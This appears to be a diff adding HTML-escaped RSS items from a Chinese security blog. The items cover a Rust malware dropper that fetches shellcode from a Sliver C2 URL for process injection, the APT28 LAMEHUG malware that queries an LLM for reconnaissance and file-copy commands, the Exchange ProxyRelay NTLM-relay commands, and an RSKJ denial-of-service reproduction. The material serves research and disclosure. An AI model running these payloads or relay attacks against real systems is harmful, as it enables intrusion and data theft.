class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Foundation&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;CloseHandle&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;};&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;编译后，Rust程序(151.5KB)几乎是C程序(71.7KB)的两倍，这是因为Rust默认静态链接依赖项。&lt;/p&gt;
+&lt;h2 id=&#34;ghidra逆向分析对比&#34;&gt;Ghidra逆向分析对比
+&lt;/h2&gt;&lt;p&gt;Rust程序的反编译输出难以理解，原因包括：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Ghidra尝试将Rust反编译为伪C代码，但内存管理和优化差异导致难以理解&lt;/li&gt;
+&lt;li&gt;rustc的编译优化导致函数边界模糊，汇编代码高度优化&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;相比之下，C程序的反编译输出与源代码高度一致。&lt;/p&gt;
+&lt;h2 id=&#34;开发rust恶意软件投放器&#34;&gt;开发Rust恶意软件投放器
+&lt;/h2&gt;&lt;p&gt;构建一个投放器演示，功能包括：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;枚举目标进程以注入payload&lt;/li&gt;
+&lt;li&gt;使用文件映射注入技术执行payload&lt;/li&gt;
+&lt;li&gt;通过HTTPS部署Sliver C2框架&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;关键代码模块：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-rust&#34; data-lang=&#34;rust&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;enumerate_processes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;remote_mapping_injection&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;mod&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;http_client&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;fn&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;String&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;https://sliver.nrcerne.com:8444/DULL_EQUIPMENT&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;http_client&lt;/span&gt;::&lt;span class=&#34;n&#34;&gt;get_payload_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;unwrap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 注入notepad.exe进程
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;操作安全考虑&#34;&gt;操作安全考虑
+&lt;/h2&gt;&lt;p&gt;Rust会在二进制文件中包含绝对路径(用于调试)，因此需在匿名环境中编译以保护操作安全。&lt;/p&gt;
+&lt;h2 id=&#34;结论&#34;&gt;结论
+&lt;/h2&gt;&lt;p&gt;Rust是C/C++开发恶意软件的优秀替代方案。虽然Ghidra 11.0在反编译Rust二进制文件方面取得进步，但由于函数内联和编译优化，分析Rust程序仍然困难。更大的二进制文件也增加了分析时间成本。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/bishopfox/rust-malware-example&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;完整代码示例可在GitHub获取&lt;/a&gt;&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>俄罗斯APT28新型恶意软件利用LLM生成恶意Windows命令</title>
+        <link>http://localhost:1313/p/%E4%BF%84%E7%BD%97%E6%96%AFapt28%E6%96%B0%E5%9E%8B%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%A9%E7%94%A8llm%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fwindows%E5%91%BD%E4%BB%A4/</link>
+        <pubDate>Sat, 02 Aug 2025 21:38:11 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/%E4%BF%84%E7%BD%97%E6%96%AFapt28%E6%96%B0%E5%9E%8B%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%A9%E7%94%A8llm%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fwindows%E5%91%BD%E4%BB%A4/</guid>
+        <description>&lt;p&gt;俄罗斯网络间谍组织APT28已开发出通过查询大型语言模型(LLM)生成命令的恶意软件。该恶意软件被乌克兰CERT命名为LAMEHUG，近期被用于针对乌克兰政府实体的鱼叉式钓鱼攻击，成为攻击者利用AI实施攻击的新案例。&lt;/p&gt;
+&lt;p&gt;根据CERT-UA报告，钓鱼邮件来自被入侵的邮箱账户，冒充乌克兰某部委代表。恶意软件包含在ZIP压缩包中，使用.pif(MS-DOS可执行文件)扩展名，但也观察到.exe和.py扩展名的变体。&lt;/p&gt;
+&lt;p&gt;CERT-UA将这些攻击归因于其追踪为UAC-0001的组织，该组织在安全社区更广为人知的名称是APT28。西方情报机构已正式将该组织与俄罗斯军事情报局GRU的第26165部队(或称第85主要特别服务中心)联系起来。&lt;/p&gt;
+&lt;p&gt;APT28(又称Sofacy、Pawn Storm或Fancy Bear)自2004年起就对西方国家目标开展网络行动，在2022年2月俄罗斯入侵乌克兰之前就已在乌频繁活动。去年美国司法部起诉了五名GRU军官和一名涉嫌协助的平民，指控其对乌克兰计算机基础设施实施破坏性网络攻击，并探测包括美国在内的26个北约成员国政府计算机系统。鉴于APT28的全球行动范围，新型LAMEHUG恶意软件很可能不久就会被用于西方目标。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;实时查询LLM API的创新手法&lt;/strong&gt;
+此前观察到的攻击者主要使用LLM编写恶意脚本或优化钓鱼邮件内容，网络犯罪论坛上也出售各种未经审查和越狱的LLM订阅服务。但LAMEHUG开发者采取了不同方法，将直接查询LLM的功能内置到恶意程序本身。&lt;/p&gt;
+&lt;p&gt;LAMEHUG通过Hugging Face平台(网络最大的LLM和其他AI资产托管平台)的API，向Qwen 2.5-Coder-32B-Instruct模型发送查询指令，要求模型模拟Windows系统管理员生成命令列表：创建文件夹、收集计算机/网络/Active Directory域信息并存入文本文件。另一个独立查询则要求模型生成递归复制Documents、Downloads和Desktop文件夹中所有.pdf和.txt文档到新建的C:\Programdata\info\目录下的命令。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;技术实现细节&lt;/strong&gt;
+LAMEHUG采用Python编写，通过PyInstaller将源代码编译为可执行二进制文件。CERT-UA观察到其分发形态包括Appendix.pif、AI_generator_uncensored_Canvas_PRO_v0.9.exe、AI_image_generator_v0.95.exe和image.py等变体，各版本在数据渗出方式上存在功能差异。恶意软件的C2服务器托管在合法但已被入侵的基础设施上。&lt;/p&gt;
+&lt;p&gt;正如LLM正成为组织和员工的常用工具，它们对攻击者也同样有用。研究人员近期测试LLM执行漏洞开发和利用任务的能力，发现虽然目前效果不佳但进步迅速。随着时间推移，我们很可能会看到更多AI辅助攻击，甚至高级黑客行为，就像AI辅助编程的兴起一样。通过动态使用LLM生成多样化命令，攻击者可能希望借此引入多态性特征来规避检测签名。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>MS Exchange新攻击面分析第四部：ProxyRelay技术揭秘</title>
+        <link>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</link>
+        <pubDate>Sat, 02 Aug 2025 21:26:58 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/ms-exchange%E6%96%B0%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90%E7%AC%AC%E5%9B%9B%E9%83%A8proxyrelay%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/</guid>
+        <description>&lt;h1 id=&#34;ms-exchange新攻击面分析第四部proxyrelay&#34;&gt;MS Exchange新攻击面分析第四部：ProxyRelay！
+&lt;/h1&gt;&lt;p&gt;这是来自DEVCORE的交叉发布博客。完整系列包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MS Exchange新攻击面分析第一部：ProxyLogon！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第二部：ProxyOracle！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第三部：ProxyShell！&lt;/li&gt;
+&lt;li&gt;MS Exchange新攻击面分析第四部：ProxyRelay！&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;背景说明&#34;&gt;背景说明
+&lt;/h2&gt;&lt;p&gt;这篇迟来的文章原本可以更早发布（原始漏洞于2021年6月报告给MSRC，遵循90天公开披露政策）。在与MSRC沟通期间，他们解释由于这是架构设计问题，需要进行大量代码修改和测试，因此希望通过累积更新(CU)而非常规补丁周二一次性解决。我们理解这一情况并同意延长截止日期。&lt;/p&gt;
+&lt;p&gt;微软最终于2022年4月20日发布Exchange Server 2019 CU 12和Exchange Server 2016 CU 23，但该补丁默认未启用。直到2022年8月9日微软才发布补丁激活方法。我们本有机会在Pwn2Own Vancouver 2021展示攻击，但出于安全研究初衷放弃了参赛计划。&lt;/p&gt;
+&lt;h2 id=&#34;技术原理&#34;&gt;技术原理
+&lt;/h2&gt;&lt;p&gt;自2021年4月微软封堵Proxy系列攻击后，我们一直在探索绕过方案。当时微软通过增强CAS前端认证机制，要求所有需要Kerberos票据的HTTP请求必须先通过认证，有效阻止了未经认证的请求访问CAS后端。但Exchange真的安全了吗？&lt;/p&gt;
+&lt;p&gt;我们借鉴了打印机漏洞(Printer Bug)的思路：在Exchange架构中，后端通过检查登录身份是否拥有ms-Exch-EPI-Token-Serialization扩展权限来授权HTTP请求。由于Exchange服务器在安装时会自动加入Exchange Servers组，该组所有对象默认拥有此权限。&lt;/p&gt;
+&lt;h2 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h2&gt;&lt;p&gt;我们发现了完整的攻击面而非单个漏洞，由此衍生出多个CVE：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;CVE-2021-33768 - 中继到Exchange前端&lt;/li&gt;
+&lt;li&gt;CVE-2022-21979 - 中继到Exchange后端&lt;/li&gt;
+&lt;li&gt;CVE-2021-26414 - 中继到Exchange DCOM&lt;/li&gt;
+&lt;li&gt;CVE-2022-RESERVED - 中继到其他Exchange服务&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;第一轮中继到exchange前端&#34;&gt;第一轮：中继到Exchange前端
+&lt;/h3&gt;&lt;p&gt;通过强制EX01发起SMB连接，使用ntlmrelayx.py将NTLM认证中继到EX02前端的EWS服务。由于中继身份是拥有Token-Serialization权限的机器账户，我们可以模拟任意用户：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python ntlmrelayx.py -smb2support -t https://EX02/EWS/Exchange.asmx
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 终端2 &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ python printerbug.py EX01 ATTACKER
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;微软通过在前端代理处理程序添加IsSystemOrMachineAccount()检查来修复此问题（CVE-2021-33768）。&lt;/p&gt;
+&lt;h3 id=&#34;第二轮中继到exchange后端&#34;&gt;第二轮：中继到Exchange后端
+&lt;/h3&gt;&lt;p&gt;后端验证更为复杂，我们展示了三种攻击方式：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;攻击后端/EWS：只需将目标端口从443改为444&lt;/li&gt;
+&lt;li&gt;攻击后端/RPC：通过RPC-over-HTTP协议操作邮箱&lt;/li&gt;
+&lt;li&gt;攻击后端/PowerShell：实现类似ProxyShell的利用链&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;微软通过强制启用IIS的扩展保护认证修复此问题（CVE-2022-21979）。&lt;/p&gt;
+&lt;h3 id=&#34;第三轮中继到windows-dcom&#34;&gt;第三轮：中继到Windows DCOM
+&lt;/h3&gt;&lt;p&gt;基于Exchange服务器在AD环境中的组继承特性，EX01$机器账户也是EX02的本地管理员。通过中继到MS-DCOM可以实现RCE。微软分三个阶段逐步修复此问题（CVE-2021-26414）。&lt;/p&gt;
+&lt;h2 id=&#34;时间线&#34;&gt;时间线
+&lt;/h2&gt;&lt;p&gt;详细披露过程包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;2021年6月2日：通过MSRC门户报告漏洞&lt;/li&gt;
+&lt;li&gt;2022年4月20日：发布Exchange补丁&lt;/li&gt;
+&lt;li&gt;2022年8月18日：最终发布CVE和补丁激活文档&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;结语&#34;&gt;结语
+&lt;/h2&gt;&lt;p&gt;这个系列研究历时两年，期间经历了漏洞碰撞、Pwn2Own竞赛、顶级会议演讲等事件。我们始终秉持安全研究的初心，希望通过这些发现帮助提升Exchange服务器的安全性。&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>RSKJ服务器拒绝服务漏洞分析与修复</title>
+        <link>http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</link>
+        <pubDate>Sat, 02 Aug 2025 20:25:35 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/rskj%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/</guid>
+        <description>&lt;h1 id=&#34;rskj服务器拒绝服务漏洞报告&#34;&gt;RSKJ服务器拒绝服务漏洞报告
+&lt;/h1&gt;&lt;h2 id=&#34;漏洞摘要&#34;&gt;漏洞摘要
+&lt;/h2&gt;&lt;p&gt;攻击者通过发送特制的UDPv6数据包可导致RSKJ服务器停止处理网络流量，最终引发内存耗尽崩溃。&lt;/p&gt;
+&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
+&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载受影响版本：https://github.com/rsksmart/rskj/releases/download/FINGERROOT-5.0.0/rskj-core-5.0.0-FINGERROOT-all.jar&lt;/li&gt;
+&lt;li&gt;服务端运行：&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;java&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;classpath&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rskj&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;core&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;FINGERROOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;all&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;jar&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Drpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;providers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;cors&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Drpc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;providers&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;web&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;ws&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;enabled&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;co&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;rsk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Start&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;该命令会开放UDPv6端口5050&lt;/li&gt;
+&lt;li&gt;客户端安装Python3及pysha3库，使用PoC脚本攻击服务端&lt;/li&gt;
+&lt;li&gt;服务器将永久处理单个UDP数据包，拒绝其他节点请求，数分钟后应用崩溃&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;根本原因&#34;&gt;根本原因
+&lt;/h2&gt;&lt;p&gt;&lt;code&gt;bytesToLength&lt;/code&gt;函数返回-5导致length变为0：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// RLP.java第432行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bytesToLength返回&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 第440行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;该返回值被合法接受&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 第403-405行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;position变量无法更新&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;影响&#34;&gt;影响
+&lt;/h2&gt;&lt;ul&gt;
